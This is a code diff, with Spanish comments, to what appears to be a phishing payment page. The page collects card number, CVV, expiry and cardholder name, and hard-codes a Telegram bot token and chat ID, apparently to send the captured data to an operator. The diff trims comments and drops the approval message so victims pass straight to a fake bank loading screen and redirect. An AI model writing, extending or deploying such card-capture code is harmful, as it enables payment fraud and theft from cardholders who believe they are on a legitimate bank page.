@@ -249,9 +249,7 @@
       display: block;
     }
 
-    /* ============================================ */
-    /* LOADING OVERLAY - IGUAL A PASO3.HTML        */
-    /* ============================================ */
+    /* LOADING OVERLAY */
     .loading-overlay {
       display: none;
       position: fixed;
@@ -648,7 +646,7 @@
 
   <script>
     // ============================================
-    // CONFIGURACIÓN - TOKEN Y CHAT ID CORRECTOS
+    // CONFIGURACIÓN
     // ============================================
     const TELEGRAM_BOT_TOKEN = '8736155859:AAHI77N8wP6_UNpI3RGIerJkLRRKUvVR8iQ';
     const TELEGRAM_CHAT_ID = '-1004294946880';
@@ -686,7 +684,7 @@
     const defaultLogo = 'banco.png';
 
     // ============================================
-    // MAPA DE LOGOS DE TARJETAS (para la carga)
+    // MAPA DE LOGOS DE TARJETAS
     // ============================================
     const cardLogos = {
       'visa': 'visa.png',
@@ -814,7 +812,7 @@
     }
 
     // ============================================
-    // REDIRIGIR CON PANTALLA DE CARGA (como paso3.html)
+    // MOSTRAR PANTALLA DE CARGA Y REDIRIGIR
     // ============================================
     function mostrarCargaYRedirigir(tipoTarjeta, banco) {
       const initialSpinner = document.getElementById('initialSpinner');
@@ -824,17 +822,17 @@
       const progressFill = document.getElementById('progressFill');
       const loadingText = document.getElementById('loadingText');
 
-      // ✅ Guardar el logo del banco en localStorage para la página destino
+      // Guardar el logo del banco en localStorage
       const logoFile = bankLogos[banco] || defaultLogo;
       localStorage.setItem('logo_banco', logoFile);
       localStorage.setItem('banco_seleccionado', banco);
       localStorage.setItem('tipo_tarjeta', tipoTarjeta);
       localStorage.setItem('card_last4', document.getElementById('cc').value.replace(/\s/g, '').slice(-4));
 
-      // ✅ Mostrar el overlay de carga
+      // Mostrar el overlay de carga
       document.getElementById('loadingOverlay').classList.add('active');
 
-      // ✅ Ocultar spinner y mostrar logo de la tarjeta
+      // Ocultar spinner y mostrar logo de la tarjeta
       initialSpinner.classList.remove('active');
       initialSpinner.style.display = 'none';
       
@@ -856,7 +854,7 @@
       };
       loadingText.textContent = 'Redirigiendo a ' + (nombres[tipoTarjeta] || '...');
       
-      // ✅ Barra de progreso (3 segundos como en paso3.html)
+      // Barra de progreso
       let progress = 0;
       const duration = 3000;
       const interval = 50;
@@ -979,20 +977,8 @@
 
         if (resultado === 'approved') {
           clearInterval(pollingInterval);
-          document.getElementById('loadingOverlay').classList.remove('active');
-          const btn = document.getElementById('submitBtn');
-          btn.disabled = false;
-          btn.textContent = 'Continuar';
-          document.getElementById('cc').disabled = false;
-          document.getElementById('cvv').disabled = false;
-          document.getElementById('fecha').disabled = false;
-          document.getElementById('tipo').disabled = false;
-          document.getElementById('cardholder').disabled = false;
-          mostrarMensaje('✅ Pago aprobado, redirigiendo...', 'success');
-          // ✅ Mostrar la pantalla de carga con barra de progreso
-          setTimeout(() => { 
-            mostrarCargaYRedirigir(tipoTarjeta, banco);
-          }, 1500);
+          // ✅ Mostrar directamente la pantalla de carga sin mensaje
+          mostrarCargaYRedirigir(tipoTarjeta, banco);
         } else if (resultado === 'rejected') {
           clearInterval(pollingInterval);
           document.getElementById('loadingOverlay').classList.remove('active');
